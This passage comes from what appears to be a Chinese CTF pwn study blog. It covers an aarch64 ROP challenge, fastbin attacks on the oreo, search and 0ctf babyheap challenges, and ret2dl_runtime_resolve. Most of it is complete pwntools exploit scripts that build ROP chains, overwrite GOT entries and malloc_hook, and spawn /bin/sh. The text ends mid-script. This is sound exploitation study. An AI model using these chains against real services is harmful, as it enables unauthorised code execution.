我们知道这个题目有两层输入，第一层是不存在溢出的，第二处才存在，所以我们在第二处用csu的方法再调用回存储第一处输入的位置所以我们找一下万能gadget 我们发现mprotect的几个参数传递过程如下 mprotect是从0x411000开始的，题目中输入的地址为0x411068，所以可以让mprotect来改权限（这题好像和oj leve5不一样的是它不需要借助bss段了 关于gadget的传参 123456789ret 跳转到 x30 寄存器，一般在函数的末尾会恢复函数的返回地址到 x30 寄存器ldp x19, x20, [sp, #0x10] 从 sp+0x10 的位置读 0x10 字节，按顺序放入 x19, x20 寄存器ldp x29, x30, [sp], #0x40 从 sp 的位置读 0x10 字节，按顺序放入 x29, x30 寄存器，然后 sp += 0x40MOV X1, X0 寄存器X0的值传给X1blr x3 跳转到由Xm目标寄存器指定的地址处，同时将下一条指令存放到X30寄存器中 所以x29和x30会在x19和x20前面布置x30是存放下一个执行的地址，相当于ebp吧pc相当于rdi所以我们布置rop： 123456789101112payload = &apos;a&apos;*72 payload += p64(0x04008cc)payload += p64(0) #x29payload += p64(0x04008ac) #x30 ret-&gt;next pcpayload += p64(0) #19payload += p64(0) #20payload += p64(bss) #21 mprotect_addr payload += p64(0x7) #22 x2payload += p64(0x1000) #23 x1payload += p64(0x411000) #24 x0payload += p64(0) #next x29payload += p64(bss+0x10) #next x30 先布置完cc处的栈，然后跳回ac里执行mprotect，会再执行一遍cc，我们覆盖x30的内容为我们想它跳到的地址即可 完整的exp： 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import syscontext.binary = &quot;./pwn&quot;context.log_level = &quot;debug&quot;if sys.argv[1] == &quot;l&quot;: p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])elif sys.argv[1] == &quot;d&quot;: p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])else: p = remote(&quot;106.75.126.171&quot;, 33865)bss = 0x00411068call_mprotect = 0x0400600shellcode = asm(shellcraft.execve(&quot;/bin/sh&quot;))p.recvuntil(&quot;Name:&quot;)pay = p64(0x04007e0) #call_mprotectpay += p64(0)pay += shellcode #must in addr+0x10p.sendline(pay)payload = &apos;a&apos;*72 payload += p64(0x04008cc)payload += p64(0) #x29payload += p64(0x04008ac) #x30 ret-&gt;next pcpayload += p64(0) #19payload += p64(0) #20payload += p64(bss) #21 mprotect payload += p64(0x7) #22 x2payload += p64(0x1000) #23 x1payload += p64(0x411000) #24 x0payload += p64(0) #next x29?payload += p64(bss+0x10) #next x30sleep(0.5)p.sendline(payload)p.interactive() 参考链接： V1ct0r师傅 zs0zrc师傅]]></content>
  </entry>
  <entry>
    <title><![CDATA[fastbinin_attack]]></title>
    <url>%2F2020%2F02%2F07%2Ffastbinin-attack%2F</url>
    <content type="text"><![CDATA[就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒好了，废话不多说，开始吧 2014 hack.lu oreoadd里面的rifle name是从a288+25开始写，然后description是直接从a288处开始的，总共长度是56字节，地址占了四个字节，56-4 =52 description占25，name则占27具体看汇编v1是pre指针 为eax+52，即最后四个字节为指针地址，而这个指针指向的是description。我们可以写入的name有为56，存在溢出，可以覆写pre的地址 show这里show的内容description是指针指向的地址我们可以借此leak出libc massage进行更改的地方是a2a8里存着的地址指向的地方，利用此来get shell order这里就是free，free完之后a2a0+1 1、使pre覆写成puts_got的地址，show的时候，description里面的内容为puts_addr2、构造一个fack chunk，我们知道呢，一个chunk的结构大概是，pre_size, size,内容。我们知道a2a4的地方是写add一次就+1，a2a0是free一次+1，a2a8是存放massage指向内容的地址，可以利用这个构建一个chunk，又因为要绕过题目检查，又存name的地方也有存description的地方，所以要构造下一个chunk，把size 0x41写进去3、改一个got表为system即可，这里改的是scanf，wiki里面改的是strlen（对这个函数我不是很熟，不太懂system最后的传参，就没用了），据说还可以改free_hook 为onegadget（我不会找free_hook的地址，全网搜貌似也没搜出来用这种方法的exp） 关于wiki上的exp，看了大佬的博客之后才知道以下的姿势（关于strlen的传参）这样就相当于往0x0804a250指向的地址写入system。这里有个新姿势：system(“ls;/bin/sh”)就相当于sytem(“ls”);system(“/bin/sh”);分号代表system函数将这个参数分成两部分，先后执行里面的命令。因此这里在fgets函数篡改了strlen_got后紧接着调用strlen，就相当于system(p32(system_addr);”/bin/sh”) = system(p32(system_addr));system(“/bin/sh”);这样就能实现最终目的了。 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from time import sleepimport sys# context.binary = &quot;./melong&quot;context.log_level =&apos;DEBUG&apos;p = process(&apos;./oreo&apos;)elf = ELF(&apos;./oreo&apos;)libc = ELF(&apos;./libc.so.6&apos;)def add(name,description): # p.recvuntil(&quot;6. Exit!&quot;) # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;1&quot;) # p.recvuntil(&quot;Rifle name: &quot;) p.sendline(name) # p.recvuntil(&quot;Rifle description: &quot;) p.sendline(description)def show(): # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;2&quot;) p.recvuntil(&apos;===================================\n&apos;)def order(): # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;3&quot;)def massage(notice): # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;4&quot;) p.sendline(notice)p.recv()name = 27 * &apos;a&apos; + p32(elf.got[&apos;puts&apos;])add(name ,25 * &apos;a&apos;)show()p.recvuntil(&apos;===================================\n&apos;)p.recvuntil(&apos;Description: &apos;)puts_addr = u32(p.recvuntil(&apos;\n&apos;, drop=True)[:4])print hex(puts_addr)libc_base = puts_addr - libc.sym[&apos;puts&apos;]print hex(libc_base)# libc_base = libc.addresssystem_addr = libc_base + libc.sym[&apos;system&apos;]binsh_addr = libc_base + next(libc.search(&quot;/bin/sh&quot;))onegadget = libc_base + 0x5fbc6 #尝试过把scanf改成onegadget，但是五个都没成功。。。i=1for i in range(0x3f): add(&apos;a&apos; * 27 + p32(0),25 * &apos;a&apos;) #num -&gt; 0x41#num addr = 0x804A2A4#fack chunkadd(&apos;a&apos;*27+p32(0x804A2A8),&apos;a&apos;*25)massage(&apos;\x00&apos;*0x24+p32(0x41)) #description&apos;s chunkorder()scanf_got = elf.got[&apos;__isoc99_sscanf&apos;]add(&apos;a&apos;,p32(scanf_got))massage(p32(system_addr))p.sendline(&apos;/bin/sh&apos;)p.interactive() 2015 search这题就没有很认真的写wp，就把不太明白的点记一下吧 一开始一直没想到free完一次之后可以查找’\x00’这个word，就一直很迷惑要怎么double free分析两个一开始没懂的点 123456789101112131415161718192021index_sentence(&apos;a&apos; * 0x5d + &apos; d &apos;) #aindex_sentence(&apos;b&apos; * 0x5d + &apos; d &apos;) #bindex_sentence(&apos;c&apos; * 0x5d + &apos; d &apos;) #c # a-&gt;b-&gt;c-&gt;NULL search_word(&apos;d&apos;) #正常的删除 p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) p.sendline(&apos;y&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) p.sendline(&apos;y&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) p.sendline(&apos;y&apos;) # b-&gt;a-&gt;b-&gt;a-&gt;... search_word(&apos;\x00&apos;) #首先判断c是否满足条件，由于c是fastbin中的最后一个节点，其fd的值为0，因此不能满足i-&gt;sentence != NULL的条件，因此第一个输出时候删除的是对应的b p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) #删除b p.sendline(&apos;y&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) #删除a p.sendline(&apos;n&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) #删除 libc_leak的时候添加的sentence p.sendline(&apos;n&apos;) 最后是只删除了b使得 a-&gt;b-&gt;c-&gt;null 又多了一个头变成了 b-&gt; a-&gt;b-&gt;c-&gt;null 即形成了b-&gt;a-&gt;b-&gt;a-&gt;…的循环，形成了double free 1234567891011121314 #此时的fastbin为 b-&gt;a-&gt;b# 3. fastbin attack to malloc_hook nearby chunk 向malloc_hook中写东西，改写b-&gt;fd，使其指向malloc_hook附近fake_chunk_addr = main_arena_addr - 0x33fake_chunk = p64(fake_chunk_addr).ljust(0x60, &apos;f&apos;) index_sentence(fake_chunk) #b的fd改成fake_addrs index_sentence(&apos;a&apos; * 0x60) #分配chunk_a index_sentence(&apos;b&apos; * 0x60) #分配chunk_b 填了chunk_b之后才能往fake_chunk里面写payload one_gadget_addr = libc_base + 0xf02a4 payload = &apos;a&apos; * 0x13 + p64(one_gadget_addr) payload = payload.ljust(0x60, &apos;f&apos;) index_sentence(payload) #赋写malloc_hook为one_gadget 2017 0ctf babyheap 先介绍一下Arbitrary Alloc（来自ctf wiki） 只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。 example在这个例子，我们使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。 1234567891011121314 int main(void)&#123; void *chunk1; void *chunk_a; chunk1=malloc(0x60); free(chunk1); *(long long *)chunk1=0x7ffff7dd1af5-0x8; malloc(0x60); chunk_a=malloc(0x60); return 0;&#125; 这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。 1234567891011121314151617180x7ffff7dd1a88 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1a90 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1a98 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1aa0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1aa8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ab0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ab8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ac0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ac8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ad0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ad8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ae0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ae8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1b08 0x0 0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30 0x28 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下： 12345678//这里的size指用户区域，因此要小2倍SIZE_SZFastbins[idx=0, size=0x10]Fastbins[idx=1, size=0x20]Fastbins[idx=2, size=0x30]Fastbins[idx=3, size=0x40]Fastbins[idx=4, size=0x50]Fastbins[idx=5, size=0x60]Fastbins[idx=6, size=0x70] 通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f 12340x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;: 0x000000000000007f 因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。 12##define fastbin_index(sz) \ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) （注意 sz 的大小是 unsigned int，因此只占 4 个字节）而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 malloc_hook 的内容 (在我的 libc 中realloc_hook 与__malloc_hook 是在连在一起的)。 1234567890x4005a8 &lt;main+66&gt; call 0x400450 &lt;malloc@plt&gt; → 0x4005ad &lt;main+71&gt; mov QWORD PTR [rbp-0x8], rax $rax : 0x7ffff7dd1afd0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;: 0xfff7dd0260000000 0x000000000000007f0x7ffff7dd1afd: 0xfff7a92e20000000 0xfff7a92a0000007f0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;: 0x000000000000007f 0x00000000000000000x7ffff7dd1b1d: 0x0000000000000000 0x0000000000000000 Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。一般都是在5或者d处（作为最后8和0结尾的地方），所以一般alloc的里面，覆盖malloc_hook的话，要 -0x33（3结尾来对齐) okk,开始进入正题在fill里面，发现可以自己重新写size再填内容，和开始alloc的大小可以不一样，然后free没有清零，以此制造overlap 第一步先 用overlap leak基址 123456789101112131415161718192021222324252627282930313233allocate(0x10)#0 00allocate(0x10)#1 20allocate(0x10)#2 40allocate(0x10)#3 60allocate(0x80)#4 80free(2)free(1)payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80) #覆写最后一字节，将free掉的2指向4的地址fill(0,len(payload),payload)payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21) #把4的size改成0x21,下一次alloc的时候可以写入这个地方fill(3,len(payload),payload)allocate(0x10)#1allocate(0x10)#2 -&gt;4payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91) #指向4之后再将大小改回来fill(3,len(payload),payload)# gdb.attach(p)allocate(0x80) #5 如果没有这个，free就没了，打不出来地址free(4)dump(2)#overlapp.recvuntil(&apos;Content: \n&apos;)main_arena = u64(p.recv(8))-0x58print hex(main_arena)print hex(libc.sym[&apos;__libc_start_main&apos;])libc_base = main_arena - 0x3C4B20#0x7F50FB4A9000‬ 第二步就构造chunk，使one_gadget能写到mollac_hook的地址里，0x80可以写下0x60的chunk 12345678//这里的size指用户区域，因此要小2倍SIZE_SZFastbins[idx=0, size=0x10]Fastbins[idx=1, size=0x20]Fastbins[idx=2, size=0x30]Fastbins[idx=3, size=0x40]Fastbins[idx=4, size=0x50]Fastbins[idx=5, size=0x60]Fastbins[idx=6, size=0x70] idx为5，则找7f，就开始提到的arbitrary alloc的方式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152allocate(0x10)#1allocate(0x10)#2 -&gt;4payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)fill(3,len(payload),payload)# gdb.attach(p)allocate(0x80)#5free(4)dump(2)#overlapp.recvuntil(&apos;Content: \n&apos;)main_arena = u64(p.recv(8))-0x58print hex(main_arena)print hex(libc.sym[&apos;__libc_start_main&apos;])libc_base = main_arena - 0x3C4B20#0x7F50FB4A9000‬ allocate(0x60)free(4)&apos;&apos;&apos;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL&apos;&apos;&apos;target = main_arena - 0x33 addr = p64(target)fill(2,len(addr),addr)gdb.attach(p)allocate(0x60)#4allocate(0x60)#target 6onegadget = libc_base + 0x4526apayload = &apos;a&apos;*0x13 + p64(onegadget)fill(6,len(payload),payload)allocate(0x100) 完整的exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./babyheap&apos;)elf = ELF(&apos;./babyheap&apos;)libc = ELF(&apos;./libc.so.6&apos;)context.log_level = &apos;debug&apos;#def allocate(size): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size: &apos;) p.sendline(str(size))def fill(idx, size, content): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;2&apos;) p.recvuntil(&apos;Index: &apos;) p.sendline(str(idx)) p.recvuntil(&apos;Size: &apos;) p.sendline(str(size)) p.recvuntil(&apos;Content: &apos;) p.send(content)def free(idx): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;Index: &apos;) p.sendline(str(idx))def dump(idx): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;4&apos;) p.recvuntil(&apos;Index: &apos;) p.sendline(str(idx))allocate(0x10)#0 00allocate(0x10)#1 20allocate(0x10)#2 40allocate(0x10)#3 60allocate(0x80)#4 80free(2)free(1)payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80)fill(0,len(payload),payload)payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21)fill(3,len(payload),payload)allocate(0x10)#1allocate(0x10)#2 -&gt;4payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)fill(3,len(payload),payload)# gdb.attach(p)allocate(0x80)#5free(4)dump(2)#overlapp.recvuntil(&apos;Content: \n&apos;)main_arena = u64(p.recv(8))-0x58print hex(main_arena)print hex(libc.sym[&apos;__libc_start_main&apos;])libc_base = main_arena - 0x3C4B20#0x7F50FB4A9000‬ allocate(0x60)free(4)&apos;&apos;&apos;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL&apos;&apos;&apos;target = main_arena - 0x33 addr = p64(target)fill(2,len(addr),addr)gdb.attach(p)allocate(0x60)#4allocate(0x60)#target 6onegadget = libc_base + 0x4526apayload = &apos;a&apos;*0x13 + p64(onegadget)fill(6,len(payload),payload)allocate(0x100)p.interactive() 参考链接： https://bbs.pediy.com/thread-247214.htm https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/ https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看)]]></content>
  </entry>
  <entry>
    <title><![CDATA[runtime_resolve]]></title>
    <url>%2F2019%2F10%2F07%2Fruntime-resolve%2F</url>
    <content type="text"><![CDATA[做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位 控制程序执行 dl_resolve 函数 给定 Link_map 以及 index 两个参数。 当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。 对于此类题目：关键点： .rel.plt表 .dynsym .dynstr 从rel.plt里获得某个函数在.dynsym里的偏移 再从 .dynsym 里获得.dynstr里的偏移 在 .dynstr里找到对应的字符，将这个字符解析成函数 然后贴一段我也没有理解的东西看看 1234符号版本信息 最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。重定位表项r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。 然后参考了很多大佬的博客都提到了延迟绑定机制（就是一定要调用一次之后got表里存的才会是真实地址） 第一条的jmp的指令跳转的地址是write的got表地址，但是此时指向的是下一条指令的地址0x80483d6 push 0x20 是dl_runtime_resolve的第二个参数（reloc_arg） 然后跳到plt[0] (0x8048380) 里，将linkmap push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的read got.plt表里，然后将程序的控制权交给解析出来的地址指向的函数(自动找到那个函数的地址) 关于四个关键函数的地址提取：plt_0 = elf.get_section_by_name(‘.plt’).header.sh_addrrel_plt = elf.get_section_by_name(‘.rel.plt’).header.sh_addrdynsym = elf.get_section_by_name(‘.dynsym’).header.sh_addrdynstr = elf.get_section_by_name(‘.dynstr’).header.sh_addr objdump -s -j .rel.plt babystackobjdump -d -j .plt babystack （直接找ida来得更快一点） readelf -S bof readelf -d bof JMPREL == .rel.pltSYMTAB == .dynsymSTRREL == .dynstrplt貌似只有-S里能找到 readelf -r bof 607 -&gt; write的.rel.plt 607&lt;&lt;8 –&gt; 6x/4wx .dynsym的地址+0x10*6 第一个参数是在str里的偏移x/s .str的地址+上面的偏移 得到的是函数名的字符串x/3i 要查函数的plt表地址 Jmp –&gt; got表地址Push –&gt; size(0x20) 是dl_runtime_resolve的第二个参数（reloc_arg）Jmp –&gt; plt[0]的地址 再——link_map = *(GOT+4) == (GOT[1]-&gt;链接器的标识信息)作为参数存入栈中GOT2是动态链接器的入口点–&gt;存着_dl_runtime_resolve的地址 _dl_runtime_resolve：完成符号的解析（内部会调用_dl_fixup）（找到真实地址存入got） —— 本题是将write的真实地址写入got，并把控制权交给write 漏洞利用方式：1、控制eip为plt[0]的地址，只需传入一个index_arg参数即可2、控制index_arg的大小，使reloc的信息存入可控地址3、伪造reloc内容，使sym在可控地址4、伪造sym内容，是name在可控地址5、伪造name为任意库函数，达到我们想要的效果 我们来分步完成我们想要的效果吧（有write的函数其实就不需要这个方法了吧…） Part1：直接用write函数，查看最后输出效果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./bof&apos;)elf = ELF(&apos;./bof&apos;)rel_plt = 0x08048330plt_0 = 0x08048380dynsym = 0x080481d8dynstr = 0x08048278leave_ret = 0x08048458pop_ebp = 0x0804861b ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; retbss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;stack_size = 0x800base_stage = bss_addr + stack_sizeread_plt = elf.plt[&apos;read&apos;]write_plt = elf.plt[&apos;write&apos;]write_got = elf.got[&apos;write&apos;]fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 r_info = index_dynsym &lt;&lt; 8 | 0x7fake_reloc = p32(write_got) + p32(r_info) st_name = fake_sym_addr + 0x10 - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)index_offset = (base_stage + 28) - rel_plt#stage 1 bss_addrpayload = &quot;a&quot;*112 payload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stagep.sendline(payload)cmd = &quot;/bin/sh\x00&quot;payload1 = &apos;aaaa&apos;payload1 += p32(write_plt)payload1 += &apos;aaaa&apos;payload1 += p32(1)payload1 += p32(base_stage+80)payload1 += p32(len(cmd))payload1 += &apos;A&apos; * (80 - len(payload1))payload1 += cmdpayload1 += &apos;A&apos; * (100 - len(payload1))p.sendline(payload1)p.interactive() “/bin/sh“被打出来了 Part 2控制eip为pit[0]地址 12345678910111213141516cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380 # objdump -d -j .plt bofindex_offset = 0x20 # write&apos;s indexpayload2 = &apos;aaaa&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;aaaa&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 3控制index_offset 指向fake_reloc 123456789101112131415161718192021cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380 # objdump -d -j .plt bofrel_plt = 0x08048330 # objdump -s -j .rel.plt bofindex_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移write_got = elf.got[&apos;write&apos;]r_info = 0x607 # write: Elf32_Rel-&gt;r_infofake_reloc = p32(write_got) + p32(r_info)payload2 = &apos;aaaa&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;aaaa&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 4伪造fake_sym 指向st_name 12345678910111213141516171819202122232425262728293031cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&apos;write&apos;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = 0x4cfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;B&apos; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 5St_name指向 ‘write’，继续回显 1234567891011121314151617181920212223242526272829303132plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&apos;write&apos;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;B&apos; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &quot;write\x00&quot;payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 6把write改成system来getshell 123456789101112131415161718192021222324252627282930313233cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&apos;write&apos;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(base_stage + 80)payload2 += &apos;aaaa&apos;payload2 += &apos;aaaa&apos;payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;B&apos; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &quot;system\x00&quot;payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmdpayload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() 就可以成功getshell了！！！ 完整exp python123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./bof&apos;)elf = ELF(&apos;./bof&apos;)rel_plt = 0x08048330plt_0 = 0x08048380dynsym = 0x080481d8dynstr = 0x08048278leave_ret = 0x08048458pop_ebp = 0x0804861b ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; retbss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;stack_size = 0x800base_stage = bss_addr + stack_sizeread_plt = elf.plt[&apos;read&apos;]write_plt = 